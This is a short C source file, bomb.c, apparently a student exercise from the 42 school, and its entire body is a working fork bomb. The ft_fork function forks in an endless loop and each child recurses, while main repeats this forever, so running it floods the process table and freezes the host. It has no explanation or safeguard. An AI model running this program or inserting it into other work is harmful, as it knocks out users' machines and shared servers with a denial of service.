/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bomb.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: apineda <apineda@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/04/07 19:40:57 by apineda           #+#    #+#             */
/*   Updated: 2017/04/07 21:09:58 by apineda          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <signal.h>
#include <unistd.h>

static void ft_fork(void)
{
	pid_t	child;

	while(1)
	{
		child = fork();
		if (child == 0)
			ft_fork();
	}
}

int main(void)
{
	while(1)
		ft_fork();
	return 0;
}